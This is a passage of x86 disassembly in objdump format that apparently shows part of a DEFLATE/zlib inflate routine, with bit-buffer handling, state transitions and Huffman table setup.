  406473:	19 c0                	sbb    %eax,%eax
  406475:	f7 d0                	not    %eax
  406477:	83 e0 40             	and    $0x40,%eax
  40647a:	03 47 3c             	add    0x3c(%edi),%eax
  40647d:	83 fa 0b             	cmp    $0xb,%edx
  406480:	0f 84 ad 0b 00 00    	je     0x407033
  406486:	83 fa 0e             	cmp    $0xe,%edx
  406489:	0f 84 81 0b 00 00    	je     0x407010
  40648f:	83 fa 13             	cmp    $0x13,%edx
  406492:	0f 84 78 0b 00 00    	je     0x407010
  406498:	31 d2                	xor    %edx,%edx
  40649a:	8b bc 24 90 00 00 00 	mov    0x90(%esp),%edi
  4064a1:	01 d0                	add    %edx,%eax
  4064a3:	09 de                	or     %ebx,%esi
  4064a5:	89 47 2c             	mov    %eax,0x2c(%edi)
  4064a8:	74 12                	je     0x4064bc
  4064aa:	83 bc 24 94 00 00 00 	cmpl   $0x4,0x94(%esp)
  4064b1:	04 
  4064b2:	8b 44 24 38          	mov    0x38(%esp),%eax
  4064b6:	0f 85 b9 fe ff ff    	jne    0x406375
  4064bc:	8b 5c 24 38          	mov    0x38(%esp),%ebx
  4064c0:	b8 fb ff ff ff       	mov    $0xfffffffb,%eax
  4064c5:	85 db                	test   %ebx,%ebx
  4064c7:	0f 45 c3             	cmovne %ebx,%eax
  4064ca:	83 c4 7c             	add    $0x7c,%esp
  4064cd:	5b                   	pop    %ebx
  4064ce:	5e                   	pop    %esi
  4064cf:	5f                   	pop    %edi
  4064d0:	5d                   	pop    %ebp
  4064d1:	c3                   	ret
  4064d2:	83 fb 1f             	cmp    $0x1f,%ebx
  4064d5:	77 2a                	ja     0x406501
  4064d7:	85 ff                	test   %edi,%edi
  4064d9:	0f 84 71 fc ff ff    	je     0x406150
  4064df:	89 d9                	mov    %ebx,%ecx
  4064e1:	eb 08                	jmp    0x4064eb
  4064e3:	85 ff                	test   %edi,%edi
  4064e5:	0f 84 35 0b 00 00    	je     0x407020
  4064eb:	83 c5 01             	add    $0x1,%ebp
  4064ee:	0f b6 45 ff          	movzbl -0x1(%ebp),%eax
  4064f2:	83 ef 01             	sub    $0x1,%edi
  4064f5:	d3 e0                	shl    %cl,%eax
  4064f7:	83 c1 08             	add    $0x8,%ecx
  4064fa:	01 c6                	add    %eax,%esi
  4064fc:	83 f9 1f             	cmp    $0x1f,%ecx
  4064ff:	76 e2                	jbe    0x4064e3
  406501:	8b 44 24 24          	mov    0x24(%esp),%eax
  406505:	8b 40 20             	mov    0x20(%eax),%eax
  406508:	85 c0                	test   %eax,%eax
  40650a:	74 03                	je     0x40650f
  40650c:	89 70 04             	mov    %esi,0x4(%eax)
  40650f:	8b 44 24 24          	mov    0x24(%esp),%eax
  406513:	f6 40 11 02          	testb  $0x2,0x11(%eax)
  406517:	0f 85 97 10 00 00    	jne    0x4075b4
  40651d:	8b 44 24 24          	mov    0x24(%esp),%eax
  406521:	31 f6                	xor    %esi,%esi
  406523:	31 db                	xor    %ebx,%ebx
  406525:	c7 00 03 00 00 00    	movl   $0x3,(%eax)
  40652b:	e9 9a 05 00 00       	jmp    0x406aca
  406530:	8b 44 24 24          	mov    0x24(%esp),%eax
  406534:	8b 40 40             	mov    0x40(%eax),%eax
  406537:	8b 4c 24 24          	mov    0x24(%esp),%ecx
  40653b:	c7 01 0f 00 00 00    	movl   $0xf,(%ecx)
  406541:	85 c0                	test   %eax,%eax
  406543:	0f 84 a7 0b 00 00    	je     0x4070f0
  406549:	8b 4c 24 28          	mov    0x28(%esp),%ecx
  40654d:	39 c7                	cmp    %eax,%edi
  40654f:	0f 46 c7             	cmovbe %edi,%eax
  406552:	39 c8                	cmp    %ecx,%eax
  406554:	0f 47 c1             	cmova  %ecx,%eax
  406557:	85 c0                	test   %eax,%eax
  406559:	0f 84 f1 fb ff ff    	je     0x406150
  40655f:	89 44 24 08          	mov    %eax,0x8(%esp)
  406563:	89 44 24 3c          	mov    %eax,0x3c(%esp)
  406567:	8b 44 24 30          	mov    0x30(%esp),%eax
  40656b:	89 6c 24 04          	mov    %ebp,0x4(%esp)
  40656f:	89 04 24             	mov    %eax,(%esp)
  406572:	e8 e1 42 00 00       	call   0x40a858
  406577:	8b 54 24 3c          	mov    0x3c(%esp),%edx
  40657b:	8b 44 24 24          	mov    0x24(%esp),%eax
  40657f:	29 54 24 28          	sub    %edx,0x28(%esp)
  406583:	01 54 24 30          	add    %edx,0x30(%esp)
  406587:	29 50 40             	sub    %edx,0x40(%eax)
  40658a:	29 d7                	sub    %edx,%edi
  40658c:	01 d5                	add    %edx,%ebp
  40658e:	8b 00                	mov    (%eax),%eax
  406590:	e9 bb f7 ff ff       	jmp    0x405d50
  406595:	8b 44 24 24          	mov    0x24(%esp),%eax
  406599:	8b 40 68             	mov    0x68(%eax),%eax
  40659c:	89 44 24 48          	mov    %eax,0x48(%esp)
  4065a0:	8b 54 24 24          	mov    0x24(%esp),%edx
  4065a4:	89 6c 24 44          	mov    %ebp,0x44(%esp)
  4065a8:	8b 42 60             	mov    0x60(%edx),%eax
  4065ab:	89 44 24 58          	mov    %eax,0x58(%esp)
  4065af:	03 42 64             	add    0x64(%edx),%eax
  4065b2:	89 44 24 54          	mov    %eax,0x54(%esp)
  4065b6:	8b 54 24 54          	mov    0x54(%esp),%edx
  4065ba:	39 54 24 48          	cmp    %edx,0x48(%esp)
  4065be:	0f 83 ae 12 00 00    	jae    0x407872
  4065c4:	8b 44 24 24          	mov    0x24(%esp),%eax
  4065c8:	8b 48 54             	mov    0x54(%eax),%ecx
  4065cb:	8b 50 4c             	mov    0x4c(%eax),%edx
  4065ce:	b8 01 00 00 00       	mov    $0x1,%eax
  4065d3:	d3 e0                	shl    %cl,%eax
  4065d5:	89 d5                	mov    %edx,%ebp
  4065d7:	89 54 24 40          	mov    %edx,0x40(%esp)
  4065db:	8d 40 ff             	lea    -0x1(%eax),%eax
  4065de:	89 44 24 3c          	mov    %eax,0x3c(%esp)
  4065e2:	21 f0                	and    %esi,%eax
  4065e4:	8d 44 85 00          	lea    0x0(%ebp,%eax,4),%eax
  4065e8:	0f b6 48 01          	movzbl 0x1(%eax),%ecx
  4065ec:	0f b7 50 02          	movzwl 0x2(%eax),%edx
  4065f0:	0f b6 c1             	movzbl %cl,%eax
  4065f3:	39 c3                	cmp    %eax,%ebx
  4065f5:	73 58                	jae    0x40664f
  4065f7:	85 ff                	test   %edi,%edi
  4065f9:	0f 84 40 11 00 00    	je     0x40773f
  4065ff:	8b 6c 24 44          	mov    0x44(%esp),%ebp
  406603:	89 d9                	mov    %ebx,%ecx
  406605:	eb 11                	jmp    0x406618
  406607:	89 f6                	mov    %esi,%esi
  406609:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  406610:	85 ff                	test   %edi,%edi
  406612:	0f 84 08 0a 00 00    	je     0x407020
  406618:	83 c5 01             	add    $0x1,%ebp
  40661b:	0f b6 45 ff          	movzbl -0x1(%ebp),%eax
  40661f:	8b 5c 24 40          	mov    0x40(%esp),%ebx
  406623:	83 ef 01             	sub    $0x1,%edi
  406626:	d3 e0                	shl    %cl,%eax
  406628:	83 c1 08             	add    $0x8,%ecx
  40662b:	01 c6                	add    %eax,%esi
  40662d:	8b 44 24 3c          	mov    0x3c(%esp),%eax
  406631:	21 f0                	and    %esi,%eax
  406633:	8d 04 83             	lea    (%ebx,%eax,4),%eax
  406636:	0f b6 58 01          	movzbl 0x1(%eax),%ebx
  40663a:	0f b7 50 02          	movzwl 0x2(%eax),%edx
  40663e:	0f b6 c3             	movzbl %bl,%eax
  406641:	39 c8                	cmp    %ecx,%eax
  406643:	77 cb                	ja     0x406610
  406645:	89 6c 24 44          	mov    %ebp,0x44(%esp)
  406649:	89 dd                	mov    %ebx,%ebp
  40664b:	89 cb                	mov    %ecx,%ebx
  40664d:	89 e9                	mov    %ebp,%ecx
  40664f:	66 83 fa 0f          	cmp    $0xf,%dx
  406653:	0f 86 c7 0c 00 00    	jbe    0x407320
  406659:	66 83 fa 10          	cmp    $0x10,%dx
  40665d:	0f 84 57 10 00 00    	je     0x4076ba
  406663:	66 83 fa 11          	cmp    $0x11,%dx
  406667:	0f 84 fc 10 00 00    	je     0x407769
  40666d:	8d 48 07             	lea    0x7(%eax),%ecx
  406670:	39 cb                	cmp    %ecx,%ebx
  406672:	89 ca                	mov    %ecx,%edx
  406674:	73 3f                	jae    0x4066b5
  406676:	85 ff                	test   %edi,%edi
  406678:	0f 84 c1 10 00 00    	je     0x40773f
  40667e:	89 d9                	mov    %ebx,%ecx
  406680:	8b 6c 24 44          	mov    0x44(%esp),%ebp
  406684:	89 c3                	mov    %eax,%ebx
  406686:	89 d0                	mov    %edx,%eax
  406688:	eb 0e                	jmp    0x406698
  40668a:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  406690:	85 ff                	test   %edi,%edi
  406692:	0f 84 88 09 00 00    	je     0x407020
  406698:	83 c5 01             	add    $0x1,%ebp
  40669b:	0f b6 55 ff          	movzbl -0x1(%ebp),%edx
  40669f:	83 ef 01             	sub    $0x1,%edi
  4066a2:	d3 e2                	shl    %cl,%edx
  4066a4:	83 c1 08             	add    $0x8,%ecx
  4066a7:	01 d6                	add    %edx,%esi
  4066a9:	39 c1                	cmp    %eax,%ecx
  4066ab:	72 e3                	jb     0x406690
  4066ad:	89 d8                	mov    %ebx,%eax
  4066af:	89 6c 24 44          	mov    %ebp,0x44(%esp)
  4066b3:	89 cb                	mov    %ecx,%ebx
  4066b5:	89 c1                	mov    %eax,%ecx
  4066b7:	29 c3                	sub    %eax,%ebx
  4066b9:	d3 ee                	shr    %cl,%esi
  4066bb:	83 eb 07             	sub    $0x7,%ebx
  4066be:	89 f1                	mov    %esi,%ecx
  4066c0:	89 f2                	mov    %esi,%edx
  4066c2:	83 e1 7f             	and    $0x7f,%ecx
  4066c5:	8d 71 0b             	lea    0xb(%ecx),%esi
  4066c8:	89 f1                	mov    %esi,%ecx
  4066ca:	89 d6                	mov    %edx,%esi
  4066cc:	31 d2                	xor    %edx,%edx
  4066ce:	c1 ee 07             	shr    $0x7,%esi
  4066d1:	8b 44 24 48          	mov    0x48(%esp),%eax
  4066d5:	89 cd                	mov    %ecx,%ebp
  4066d7:	01 c8                	add    %ecx,%eax
  4066d9:	3b 44 24 54          	cmp    0x54(%esp),%eax
  4066dd:	89 44 24 3c          	mov    %eax,0x3c(%esp)
  4066e1:	0f 87 cb 13 00 00    	ja     0x407ab2
  4066e7:	8b 4c 24 48          	mov    0x48(%esp),%ecx
  4066eb:	8b 44 24 24          	mov    0x24(%esp),%eax
  4066ef:	83 c1 38             	add    $0x38,%ecx
  4066f2:	8d 04 48             	lea    (%eax,%ecx,2),%eax
  4066f5:	01 e9                	add    %ebp,%ecx
  4066f7:	8b 6c 24 24          	mov    0x24(%esp),%ebp
  4066fb:	8d 4c 4d 00          	lea    0x0(%ebp,%ecx,2),%ecx
  4066ff:	8b 6c 24 44          	mov    0x44(%esp),%ebp
  406703:	66 89 10             	mov    %dx,(%eax)
  406706:	83 c0 02             	add    $0x2,%eax
  406709:	39 c8                	cmp    %ecx,%eax
  40670b:	75 f6                	jne    0x406703
  40670d:	8b 44 24 3c          	mov    0x3c(%esp),%eax
  406711:	8b 54 24 24          	mov    0x24(%esp),%edx
  406715:	89 6c 24 44          	mov    %ebp,0x44(%esp)
  406719:	89 42 68             	mov    %eax,0x68(%edx)
  40671c:	89 44 24 48          	mov    %eax,0x48(%esp)
  406720:	e9 91 fe ff ff       	jmp    0x4065b6
  406725:	83 fb 0d             	cmp    $0xd,%ebx
  406728:	77 36                	ja     0x406760
  40672a:	85 ff                	test   %edi,%edi
  40672c:	0f 84 1e fa ff ff    	je     0x406150
  406732:	89 d9                	mov    %ebx,%ecx
  406734:	eb 12                	jmp    0x406748
  406736:	8d 76 00             	lea    0x0(%esi),%esi
  406739:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  406740:	85 ff                	test   %edi,%edi
  406742:	0f 84 d8 08 00 00    	je     0x407020
  406748:	83 c5 01             	add    $0x1,%ebp
  40674b:	0f b6 45 ff          	movzbl -0x1(%ebp),%eax
  40674f:	83 ef 01             	sub    $0x1,%edi
  406752:	d3 e0                	shl    %cl,%eax
  406754:	83 c1 08             	add    $0x8,%ecx
  406757:	01 c6                	add    %eax,%esi
  406759:	83 f9 0d             	cmp    $0xd,%ecx
  40675c:	76 e2                	jbe    0x406740
  40675e:	89 cb                	mov    %ecx,%ebx
  406760:	89 f0                	mov    %esi,%eax
  406762:	8b 4c 24 24          	mov    0x24(%esp),%ecx
  406766:	89 f2                	mov    %esi,%edx
  406768:	c1 e8 05             	shr    $0x5,%eax
  40676b:	83 e2 1f             	and    $0x1f,%edx
  40676e:	83 eb 0e             	sub    $0xe,%ebx
  406771:	83 e0 1f             	and    $0x1f,%eax
  406774:	81 c2 01 01 00 00    	add    $0x101,%edx
  40677a:	83 c0 01             	add    $0x1,%eax
  40677d:	89 51 60             	mov    %edx,0x60(%ecx)
  406780:	89 41 64             	mov    %eax,0x64(%ecx)
  406783:	89 f1                	mov    %esi,%ecx
  406785:	89 44 24 3c          	mov    %eax,0x3c(%esp)
  406789:	c1 e9 0a             	shr    $0xa,%ecx
  40678c:	c1 ee 0e             	shr    $0xe,%esi
  40678f:	83 e1 0f             	and    $0xf,%ecx
  406792:	83 c1 04             	add    $0x4,%ecx
  406795:	83 7c 24 3c 1e       	cmpl   $0x1e,0x3c(%esp)
  40679a:	89 c8                	mov    %ecx,%eax
  40679c:	89 4c 24 40          	mov    %ecx,0x40(%esp)
  4067a0:	8b 4c 24 24          	mov    0x24(%esp),%ecx
  4067a4:	89 41 5c             	mov    %eax,0x5c(%ecx)
  4067a7:	0f 87 6f 0c 00 00    	ja     0x40741c
  4067ad:	81 fa 1e 01 00 00    	cmp    $0x11e,%edx
  4067b3:	0f 87 63 0c 00 00    	ja     0x40741c
  4067b9:	8b 44 24 24          	mov    0x24(%esp),%eax
  4067bd:	31 d2                	xor    %edx,%edx
  4067bf:	89 6c 24 3c          	mov    %ebp,0x3c(%esp)
  4067c3:	89 d9                	mov    %ebx,%ecx
  4067c5:	c7 40 68 00 00 00 00 	movl   $0x0,0x68(%eax)
  4067cc:	c7 00 11 00 00 00    	movl   $0x11,(%eax)
  4067d2:	eb 26                	jmp    0x4067fa
  4067d4:	8b 44 24 24          	mov    0x24(%esp),%eax
  4067d8:	8b 40 40             	mov    0x40(%eax),%eax
  4067db:	e9 61 fd ff ff       	jmp    0x406541
  4067e0:	8b 44 24 24          	mov    0x24(%esp),%eax
  4067e4:	8b 50 5c             	mov    0x5c(%eax),%edx
  4067e7:	89 d1                	mov    %edx,%ecx
  4067e9:	89 54 24 40          	mov    %edx,0x40(%esp)
  4067ed:	8b 50 68             	mov    0x68(%eax),%edx
  4067f0:	39 d1                	cmp    %edx,%ecx
  4067f2:	76 58                	jbe    0x40684c
  4067f4:	89 6c 24 3c          	mov    %ebp,0x3c(%esp)
  4067f8:	89 d9                	mov    %ebx,%ecx
  4067fa:	83 f9 02             	cmp    $0x2,%ecx
  4067fd:	77 1f                	ja     0x40681e
  4067ff:	85 ff                	test   %edi,%edi
  406801:	0f 84 4d 0f 00 00    	je     0x407754
  406807:	83 44 24 3c 01       	addl   $0x1,0x3c(%esp)
  40680c:	83 ef 01             	sub    $0x1,%edi
  40680f:	8b 44 24 3c          	mov    0x3c(%esp),%eax
  406813:	0f b6 40 ff          	movzbl -0x1(%eax),%eax
  406817:	d3 e0                	shl    %cl,%eax
  406819:	83 c1 08             	add    $0x8,%ecx
  40681c:	01 c6                	add    %eax,%esi
  40681e:	83 c2 01             	add    $0x1,%edx
  406821:	89 f3                	mov    %esi,%ebx
  406823:	83 e9 03             	sub    $0x3,%ecx
  406826:	83 e3 07             	and    $0x7,%ebx
  406829:	0f b7 84 12 7e e0 40 	movzwl 0x40e07e(%edx,%edx,1),%eax
  406830:	00 
  406831:	c1 ee 03             	shr    $0x3,%esi
  406834:	3b 54 24 40          	cmp    0x40(%esp),%edx
  406838:	8b 6c 24 24          	mov    0x24(%esp),%ebp
  40683c:	89 55 68             	mov    %edx,0x68(%ebp)
  40683f:	66 89 5c 45 70       	mov    %bx,0x70(%ebp,%eax,2)
  406844:	72 b4                	jb     0x4067fa
  406846:	8b 6c 24 3c          	mov    0x3c(%esp),%ebp
  40684a:	89 cb                	mov    %ecx,%ebx
  40684c:	83 fa 12             	cmp    $0x12,%edx
  40684f:	8d 84 12 80 e0 40 00 	lea    0x40e080(%edx,%edx,1),%eax
  406856:	8b 4c 24 24          	mov    0x24(%esp),%ecx
  40685a:	77 23                	ja     0x40687f
  40685c:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  406860:	0f b7 10             	movzwl (%eax),%edx
  406863:	83 c0 02             	add    $0x2,%eax
  406866:	3d a6 e0 40 00       	cmp    $0x40e0a6,%eax
  40686b:	66 c7 44 51 70 00 00 	movw   $0x0,0x70(%ecx,%edx,2)
  406872:	75 ec                	jne    0x406860
  406874:	8b 44 24 24          	mov    0x24(%esp),%eax
  406878:	c7 40 68 13 00 00 00 	movl   $0x13,0x68(%eax)
  40687f:	8b 44 24 24          	mov    0x24(%esp),%eax
  406883:	8b 4c 24 50          	mov    0x50(%esp),%ecx
  406887:	89 48 6c             	mov    %ecx,0x6c(%eax)
  40688a:	89 48 4c             	mov    %ecx,0x4c(%eax)
  40688d:	8b 4c 24 4c          	mov    0x4c(%esp),%ecx
  406891:	c7 40 54 07 00 00 00 	movl   $0x7,0x54(%eax)
  406898:	c7 44 24 08 13 00 00 	movl   $0x13,0x8(%esp)
  40689f:	00 
  4068a0:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  4068a7:	89 4c 24 14          	mov    %ecx,0x14(%esp)
  4068ab:	89 c1                	mov    %eax,%ecx
  4068ad:	83 c0 54             	add    $0x54,%eax
  4068b0:	89 44 24 10          	mov    %eax,0x10(%esp)
  4068b4:	89 c8                	mov    %ecx,%eax
  4068b6:	83 c0 6c             	add    $0x6c,%eax
  4068b9:	89 44 24 0c          	mov    %eax,0xc(%esp)
  4068bd:	89 c8                	mov    %ecx,%eax
  4068bf:	83 c0 70             	add    $0x70,%eax
  4068c2:	89 44 24 04          	mov    %eax,0x4(%esp)
  4068c6:	e8 55 21 00 00       	call   0x408a20
  4068cb:	85 c0                	test   %eax,%eax
  4068cd:	89 44 24 38          	mov    %eax,0x38(%esp)
  4068d1:	0f 84 7d 0f 00 00    	je     0x407854
  4068d7:	8b 84 24 90 00 00 00 	mov    0x90(%esp),%eax
  4068de:	c7 40 18 48 d6 40 00 	movl   $0x40d648,0x18(%eax)
  4068e5:	8b 44 24 24          	mov    0x24(%esp),%eax
  4068e9:	c7 00 1d 00 00 00    	movl   $0x1d,(%eax)
  4068ef:	b8 1d 00 00 00       	mov    $0x1d,%eax
  4068f4:	e9 60 f4 ff ff       	jmp    0x405d59
  4068f9:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  406900:	8b 44 24 24          	mov    0x24(%esp),%eax
  406904:	8b 50 10             	mov    0x10(%eax),%edx
  406907:	f6 c6 04             	test   $0x4,%dh
  40690a:	89 d0                	mov    %edx,%eax
  40690c:	0f 84 a4 00 00 00    	je     0x4069b6
  406912:	8b 4c 24 24          	mov    0x24(%esp),%ecx
  406916:	8b 51 40             	mov    0x40(%ecx),%edx
  406919:	39 d7                	cmp    %edx,%edi
  40691b:	89 54 24 3c          	mov    %edx,0x3c(%esp)
  40691f:	0f 46 d7             	cmovbe %edi,%edx
  406922:	89 d1                	mov    %edx,%ecx
  406924:	89 54 24 40          	mov    %edx,0x40(%esp)
  406928:	8b 54 24 3c          	mov    0x3c(%esp),%edx
  40692c:	85 c9                	test   %ecx,%ecx
  40692e:	74 77                	je     0x4069a7
  406930:	8b 54 24 24          	mov    0x24(%esp),%edx
  406934:	8b 52 20             	mov    0x20(%edx),%edx
  406937:	85 d2                	test   %edx,%edx
  406939:	74 4b                	je     0x406986
  40693b:	8b 4a 10             	mov    0x10(%edx),%ecx
  40693e:	85 c9                	test   %ecx,%ecx
  406940:	89 4c 24 44          	mov    %ecx,0x44(%esp)
  406944:	74 40                	je     0x406986
  406946:	8b 42 14             	mov    0x14(%edx),%eax
  406949:	2b 44 24 3c          	sub    0x3c(%esp),%eax
  40694d:	8b 52 18             	mov    0x18(%edx),%edx
  406950:	89 6c 24 04          	mov    %ebp,0x4(%esp)
  406954:	89 c1                	mov    %eax,%ecx
  406956:	8b 44 24 40          	mov    0x40(%esp),%eax
  40695a:	01 c8                	add    %ecx,%eax
  40695c:	89 44 24 3c          	mov    %eax,0x3c(%esp)
  406960:	89 d0                	mov    %edx,%eax
  406962:	29 c8                	sub    %ecx,%eax
  406964:	39 54 24 3c          	cmp    %edx,0x3c(%esp)
  406968:	8b 54 24 44          	mov    0x44(%esp),%edx
  40696c:	0f 46 44 24 40       	cmovbe 0x40(%esp),%eax
  406971:	01 ca                	add    %ecx,%edx
  406973:	89 14 24             	mov    %edx,(%esp)
  406976:	89 44 24 08          	mov    %eax,0x8(%esp)
  40697a:	e8 d9 3e 00 00       	call   0x40a858
  40697f:	8b 54 24 24          	mov    0x24(%esp),%edx
  406983:	8b 42 10             	mov    0x10(%edx),%eax
  406986:	f6 c4 02             	test   $0x2,%ah
  406989:	0f 85 ed 0b 00 00    	jne    0x40757c
  40698f:	8b 4c 24 24          	mov    0x24(%esp),%ecx
  406993:	8b 44 24 40          	mov    0x40(%esp),%eax
  406997:	8b 51 40             	mov    0x40(%ecx),%edx
  40699a:	29 c7                	sub    %eax,%edi
  40699c:	01 c5                	add    %eax,%ebp
  40699e:	89 54 24 3c          	mov    %edx,0x3c(%esp)
  4069a2:	29 c2                	sub    %eax,%edx
  4069a4:	89 51 40             	mov    %edx,0x40(%ecx)
  4069a7:	85 d2                	test   %edx,%edx
  4069a9:	0f 85 a1 f7 ff ff    	jne    0x406150
  4069af:	8b 44 24 24          	mov    0x24(%esp),%eax
  4069b3:	8b 50 10             	mov    0x10(%eax),%edx
  4069b6:	8b 44 24 24          	mov    0x24(%esp),%eax
  4069ba:	f6 c6 08             	test   $0x8,%dh
  4069bd:	c7 40 40 00 00 00 00 	movl   $0x0,0x40(%eax)
  4069c4:	c7 00 06 00 00 00    	movl   $0x6,(%eax)
  4069ca:	75 30                	jne    0x4069fc
  4069cc:	8b 44 24 24          	mov    0x24(%esp),%eax
  4069d0:	8b 40 20             	mov    0x20(%eax),%eax
  4069d3:	85 c0                	test   %eax,%eax
  4069d5:	0f 84 b5 00 00 00    	je     0x406a90
  4069db:	c7 40 1c 00 00 00 00 	movl   $0x0,0x1c(%eax)
  4069e2:	e9 a9 00 00 00       	jmp    0x406a90
  4069e7:	89 f6                	mov    %esi,%esi
  4069e9:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  4069f0:	8b 44 24 24          	mov    0x24(%esp),%eax
  4069f4:	8b 50 10             	mov    0x10(%eax),%edx
  4069f7:	f6 c6 08             	test   $0x8,%dh
  4069fa:	74 d0                	je     0x4069cc
  4069fc:	85 ff                	test   %edi,%edi
  4069fe:	0f 84 4c f7 ff ff    	je     0x406150
  406a04:	89 74 24 48          	mov    %esi,0x48(%esp)
  406a08:	31 d2                	xor    %edx,%edx
  406a0a:	89 6c 24 3c          	mov    %ebp,0x3c(%esp)
  406a0e:	89 7c 24 40          	mov    %edi,0x40(%esp)
  406a12:	89 5c 24 54          	mov    %ebx,0x54(%esp)
  406a16:	8b 74 24 24          	mov    0x24(%esp),%esi
  406a1a:	eb 0a                	jmp    0x406a26
  406a1c:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  406a20:	3b 54 24 40          	cmp    0x40(%esp),%edx
  406a24:	73 31                	jae    0x406a57
  406a26:	8b 44 24 3c          	mov    0x3c(%esp),%eax
  406a2a:	83 c2 01             	add    $0x1,%edx
  406a2d:	0f b6 6c 10 ff       	movzbl -0x1(%eax,%edx,1),%ebp
  406a32:	8b 46 20             	mov    0x20(%esi),%eax
  406a35:	85 c0                	test   %eax,%eax
  406a37:	89 e9                	mov    %ebp,%ecx
  406a39:	74 18                	je     0x406a53
  406a3b:	8b 78 1c             	mov    0x1c(%eax),%edi
  406a3e:	85 ff                	test   %edi,%edi
  406a40:	74 11                	je     0x406a53
  406a42:	8b 5e 40             	mov    0x40(%esi),%ebx
  406a45:	3b 58 20             	cmp    0x20(%eax),%ebx
  406a48:	73 09                	jae    0x406a53
  406a4a:	8d 43 01             	lea    0x1(%ebx),%eax
  406a4d:	89 46 40             	mov    %eax,0x40(%esi)
  406a50:	88 0c 1f             	mov    %cl,(%edi,%ebx,1)
  406a53:	85 ed                	test   %ebp,%ebp
  406a55:	75 c9                	jne    0x406a20
  406a57:	8b 44 24 24          	mov    0x24(%esp),%eax
  406a5b:	89 6c 24 44          	mov    %ebp,0x44(%esp)
  406a5f:	8b 7c 24 40          	mov    0x40(%esp),%edi
  406a63:	8b 6c 24 3c          	mov    0x3c(%esp),%ebp
  406a67:	8b 74 24 48          	mov    0x48(%esp),%esi
  406a6b:	8b 5c 24 54          	mov    0x54(%esp),%ebx
  406a6f:	f6 40 11 02          	testb  $0x2,0x11(%eax)
  406a73:	0f 85 7c 09 00 00    	jne    0x4073f5
  406a79:	8b 44 24 44          	mov    0x44(%esp),%eax
  406a7d:	29 d7                	sub    %edx,%edi
  406a7f:	01 d5                	add    %edx,%ebp
  406a81:	85 c0                	test   %eax,%eax
  406a83:	0f 85 c7 f6 ff ff    	jne    0x406150
  406a89:	8b 44 24 24          	mov    0x24(%esp),%eax
  406a8d:	8b 50 10             	mov    0x10(%eax),%edx
  406a90:	8b 44 24 24          	mov    0x24(%esp),%eax
  406a94:	f6 c6 10             	test   $0x10,%dh
  406a97:	c7 40 40 00 00 00 00 	movl   $0x0,0x40(%eax)
  406a9e:	c7 00 07 00 00 00    	movl   $0x7,(%eax)
  406aa4:	0f 85 66 01 00 00    	jne    0x406c10
  406aaa:	8b 44 24 24          	mov    0x24(%esp),%eax
  406aae:	8b 40 20             	mov    0x20(%eax),%eax
  406ab1:	85 c0                	test   %eax,%eax
  406ab3:	0f 84 e7 01 00 00    	je     0x406ca0
  406ab9:	c7 40 24 00 00 00 00 	movl   $0x0,0x24(%eax)
  406ac0:	e9 db 01 00 00       	jmp    0x406ca0
  406ac5:	83 fb 0f             	cmp    $0xf,%ebx
  406ac8:	77 34                	ja     0x406afe
  406aca:	85 ff                	test   %edi,%edi
  406acc:	0f 84 7e f6 ff ff    	je     0x406150
  406ad2:	89 d9                	mov    %ebx,%ecx
  406ad4:	eb 12                	jmp    0x406ae8
  406ad6:	8d 76 00             	lea    0x0(%esi),%esi
  406ad9:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  406ae0:	85 ff                	test   %edi,%edi
  406ae2:	0f 84 38 05 00 00    	je     0x407020
  406ae8:	83 c5 01             	add    $0x1,%ebp
  406aeb:	0f b6 45 ff          	movzbl -0x1(%ebp),%eax
  406aef:	83 ef 01             	sub    $0x1,%edi
  406af2:	d3 e0                	shl    %cl,%eax
  406af4:	83 c1 08             	add    $0x8,%ecx
  406af7:	01 c6                	add    %eax,%esi
  406af9:	83 f9 0f             	cmp    $0xf,%ecx
  406afc:	76 e2                	jbe    0x406ae0
  406afe:	8b 44 24 24          	mov    0x24(%esp),%eax
  406b02:	8b 40 20             	mov    0x20(%eax),%eax
  406b05:	85 c0                	test   %eax,%eax
  406b07:	74 10                	je     0x406b19
  406b09:	89 f3                	mov    %esi,%ebx
  406b0b:	0f b6 d3             	movzbl %bl,%edx
  406b0e:	89 50 08             	mov    %edx,0x8(%eax)
  406b11:	89 f2                	mov    %esi,%edx
  406b13:	c1 ea 08             	shr    $0x8,%edx
  406b16:	89 50 0c             	mov    %edx,0xc(%eax)
  406b19:	8b 44 24 24          	mov    0x24(%esp),%eax
  406b1d:	8b 50 10             	mov    0x10(%eax),%edx
  406b20:	f6 c6 02             	test   $0x2,%dh
  406b23:	0f 85 83 09 00 00    	jne    0x4074ac
  406b29:	8b 44 24 24          	mov    0x24(%esp),%eax
  406b2d:	31 db                	xor    %ebx,%ebx
  406b2f:	31 f6                	xor    %esi,%esi
  406b31:	f6 c6 04             	test   $0x4,%dh
  406b34:	c7 00 04 00 00 00    	movl   $0x4,(%eax)
  406b3a:	0f 85 d5 f7 ff ff    	jne    0x406315
  406b40:	8b 44 24 24          	mov    0x24(%esp),%eax
  406b44:	8b 40 20             	mov    0x20(%eax),%eax
  406b47:	85 c0                	test   %eax,%eax
  406b49:	0f 84 0e f8 ff ff    	je     0x40635d
  406b4f:	c7 40 10 00 00 00 00 	movl   $0x0,0x10(%eax)
  406b56:	e9 02 f8 ff ff       	jmp    0x40635d
  406b5b:	90                   	nop
  406b5c:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  406b60:	8b 44 24 24          	mov    0x24(%esp),%eax
  406b64:	8b 40 08             	mov    0x8(%eax),%eax
  406b67:	85 c0                	test   %eax,%eax
  406b69:	0f 84 c4 0c 00 00    	je     0x407833
  406b6f:	8b 44 24 24          	mov    0x24(%esp),%eax
  406b73:	8b 50 10             	mov    0x10(%eax),%edx
  406b76:	85 d2                	test   %edx,%edx
  406b78:	0f 84 b5 0c 00 00    	je     0x407833
  406b7e:	83 fb 1f             	cmp    $0x1f,%ebx
  406b81:	77 2d                	ja     0x406bb0
  406b83:	85 ff                	test   %edi,%edi
  406b85:	0f 84 18 0a 00 00    	je     0x4075a3
  406b8b:	89 d9                	mov    %ebx,%ecx
  406b8d:	eb 09                	jmp    0x406b98
  406b8f:	90                   	nop
